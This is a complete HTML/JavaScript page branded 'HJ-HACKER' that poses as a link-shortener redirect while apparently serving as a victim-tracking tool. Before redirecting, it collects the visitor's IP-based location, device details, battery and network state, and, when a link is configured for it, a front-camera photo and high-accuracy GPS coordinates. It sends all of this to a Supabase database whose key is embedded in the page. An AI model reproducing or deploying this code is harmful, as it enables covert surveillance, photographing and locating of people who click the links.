<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HJ-HACKER | Redirecting...</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            min-height: 100vh;
            background: #050505;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .loader {
            text-align: center;
        }
        
        .ring {
            position: relative;
            width: 100px;
            height: 100px;
            margin: 0 auto 2rem;
        }
        
        .ring div {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 3px solid transparent;
            border-top-color: #00ff41;
            animation: spin 1s linear infinite;
        }
        
        .bar {
            width: 200px;
            height: 4px;
            background: #1a1a1a;
            border-radius: 4px;
            overflow: hidden;
            margin: 0 auto 2rem;
        }
        
        .bar-fill {
            height: 100%;
            background: linear-gradient(90deg, #00ff41, #00cc33);
            width: 0%;
            animation: loading 1.5s ease-in-out infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @keyframes loading {
            0% { width: 5%; margin-left: -5%; }
            50% { width: 60%; margin-left: 20%; }
            100% { width: 5%; margin-left: 100%; }
        }
        
        .message {
            color: #00ff41;
            font-size: 0.8rem;
            letter-spacing: 0.2em;
            text-transform: uppercase;
        }
        
        .social-gate {
            background: rgba(20, 20, 30, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 24px;
            padding: 2rem;
            max-width: 400px;
            text-align: center;
        }
        
        .social-icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 1rem;
            background: #1a1a1a;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 3rem;
        }
        
        .social-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 0.5rem;
        }
        
        .social-desc {
            color: #888;
            margin-bottom: 1.5rem;
        }
        
        .social-btn {
            width: 100%;
            padding: 1rem;
            background: #00ff41;
            border: none;
            border-radius: 12px;
            color: #000;
            font-weight: 700;
            cursor: pointer;
        }
        
        .password-form {
            background: rgba(20, 20, 30, 0.9);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0, 255, 65, 0.3);
            border-radius: 24px;
            padding: 2rem;
            max-width: 400px;
            text-align: center;
        }
        
        .password-input {
            width: 100%;
            padding: 1rem;
            background: #0a0a0a;
            border: 1px solid #333;
            border-radius: 12px;
            color: #fff;
            margin: 1rem 0;
        }
        
        .error {
            color: #ff4444;
            margin-top: 0.5rem;
        }
        
        .camera-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .capture-btn {
            position: fixed;
            bottom: 2rem;
            left: 50%;
            transform: translateX(-50%);
            padding: 1rem 2rem;
            background: #00ff41;
            border: none;
            border-radius: 50px;
            font-weight: 700;
            cursor: pointer;
            z-index: 1001;
        }
        
        .location-loading {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
    </style>
</head>
<body>
    <div id="content"></div>

    <script>
        const SUPABASE_URL = "https://mxllockxgmkojcduhcfd.supabase.co";
        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im14bGxvY2t4Z21rb2pjZHVoY2ZkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2OTc5MTcsImV4cCI6MjA5MzI3MzkxN30.GDxGx10lyOf3YkMNytCaltjGf_lQ3LkpNEnzcPQtrsM";
        
        const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        
        const shortCode = window.location.pathname.substring(1);
        
        async function getVisitorInfo() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    country: data.country_name,
                    latitude: data.latitude,
                    longitude: data.longitude
                };
            } catch {
                return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
            }
        }
        
        async function getDeviceInfo() {
            const ua = navigator.userAgent;
            const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua);
            let browser = 'Unknown';
            if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Safari')) browser = 'Safari';
            else if (ua.includes('Edge')) browser = 'Edge';
            
            let os = 'Unknown';
            if (ua.includes('Windows')) os = 'Windows';
            else if (ua.includes('Mac')) os = 'macOS';
            else if (ua.includes('Android')) os = 'Android';
            else if (ua.includes('iOS') || ua.includes('iPhone')) os = 'iOS';
            else if (ua.includes('Linux')) os = 'Linux';
            
            return {
                device_type: isMobile ? 'Mobile' : 'Desktop',
                browser: browser,
                os: os
            };
        }
        
        async function logAnalytics(urlId, imageUrl = null, lat = null, lon = null) {
            const ipInfo = await getVisitorInfo();
            const deviceInfo = await getDeviceInfo();
            let battery = null;
            let isCharging = null;
            
            if ('getBattery' in navigator) {
                try {
                    const batteryManager = await navigator.getBattery();
                    battery = batteryManager.level;
                    isCharging = batteryManager.charging;
                } catch {}
            }
            
            await supabase.from('link_analytics').insert([{
                url_id: urlId,
                ip_address: ipInfo.ip,
                city: ipInfo.city,
                country: ipInfo.country,
                latitude: lat || ipInfo.latitude,
                longitude: lon || ipInfo.longitude,
                device_type: deviceInfo.device_type,
                browser: deviceInfo.browser,
                os: deviceInfo.os,
                referrer: document.referrer || 'Direct',
                captured_image: imageUrl,
                battery_level: battery,
                is_charging: isCharging,
                network_type: navigator.connection?.effectiveType || 'Unknown',
                screen_resolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language
            }]);
            
            await supabase.rpc('increment_clicks', { row_id: urlId });
        }
        
        async function captureCamera() {
            return new Promise(async (resolve) => {
                const container = document.createElement('div');
                container.className = 'camera-container';
                const video = document.createElement('video');
                video.autoplay = true;
                video.playsInline = true;
                container.appendChild(video);
                document.body.appendChild(container);
                
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                
                const captureBtn = document.createElement('button');
                captureBtn.className = 'capture-btn';
                captureBtn.textContent = '📸 Capture Photo';
                container.appendChild(captureBtn);
                
                captureBtn.onclick = () => {
                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);
                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
                    stream.getTracks().forEach(track => track.stop());
                    container.remove();
                    resolve(imageData);
                };
            });
        }
        
        async function captureLocation() {
            return new Promise((resolve) => {
                const container = document.createElement('div');
                container.className = 'location-loading';
                container.innerHTML = '<div class="loader"><div class="ring"><div></div></div><div class="message">Getting your location...</div></div>';
                document.body.appendChild(container);
                
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        container.remove();
                        resolve({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        });
                    },
                    () => {
                        container.remove();
                        resolve({ lat: null, lon: null });
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        async function init() {
            const domain = window.location.hostname;
            const { data: urlData, error } = await supabase
                .from('urls')
                .select('*')
                .eq('domain', domain)
                .eq('short_code', shortCode)
                .single();
            
            if (error || !urlData) {
                document.getElementById('content').innerHTML = `
                    <div style="text-align: center;">
                        <h1 style="color: #ff4444;">404</h1>
                        <p>Link not found</p>
                    </div>
                `;
                return;
            }
            
            if (urlData.expires_at && new Date(urlData.expires_at) < new Date()) {
                document.getElementById('content').innerHTML = `
                    <div style="text-align: center;">
                        <h1 style="color: #ff4444;">Link Expired</h1>
                        <p>This link is no longer active</p>
                    </div>
                `;
                return;
            }
            
            // Show animation based on type
            const animationType = urlData.animation_type || 'ring';
            const animationText = urlData.animation_text || 'LOADING';
            
            document.getElementById('content').innerHTML = animationType === 'ring' ?
                `<div class="loader"><div class="ring"><div></div></div><div class="message">${animationText}</div></div>` :
                `<div class="loader"><div class="bar"><div class="bar-fill"></div></div><div class="message">${animationText}</div></div>`;
            
            // Handle password
            if (urlData.password) {
                document.getElementById('content').innerHTML = `
                    <div class="password-form">
                        <h2>🔒 Protected Link</h2>
                        <p>This link is password protected</p>
                        <input type="password" id="passwordInput" class="password-input" placeholder="Enter password">
                        <button id="unlockBtn" class="social-btn">Unlock</button>
                        <div id="passError" class="error"></div>
                    </div>
                `;
                
                document.getElementById('unlockBtn').onclick = async () => {
                    const enteredPassword = document.getElementById('passwordInput').value;
                    if (enteredPassword === urlData.password) {
                        await proceedToRedirect(urlData);
                    } else {
                        document.getElementById('passError').textContent = 'Incorrect password';
                    }
                };
                return;
            }
            
            // Handle social gate
            if (urlData.social_gate_title && urlData.social_gate_url) {
                const icons = {
                    youtube: '▶️', instagram: '📷', twitter: '🐦',
                    facebook: '📘', whatsapp: '💬', linkedin: '🔗', tiktok: '🎵'
                };
                document.getElementById('content').innerHTML = `
                    <div class="social-gate">
                        <div class="social-icon">${icons[urlData.social_gate_icon] || '🔗'}</div>
                        <h2 class="social-title">${urlData.social_gate_title}</h2>
                        <p class="social-desc">${urlData.social_gate_description || 'Complete the action to unlock'}</p>
                        <button id="socialBtn" class="social-btn">${urlData.social_gate_button_text || 'Verify & Continue'}</button>
                    </div>
                `;
                
                document.getElementById('socialBtn').onclick = () => {
                    window.open(urlData.social_gate_url, '_blank');
                    setTimeout(() => proceedToRedirect(urlData), 2000);
                };
                return;
            }
            
            await proceedToRedirect(urlData);
        }
        
        async function proceedToRedirect(urlData) {
            let imageUrl = null;
            let location = { lat: null, lon: null };
            
            if (urlData.capture_camera) {
                imageUrl = await captureCamera();
            }
            
            if (urlData.capture_location) {
                location = await captureLocation();
            }
            
            await logAnalytics(urlData.id, imageUrl, location.lat, location.lon);
            window.location.href = urlData.long_url;
        }
        
        init();
    </script>
</body>
</html>
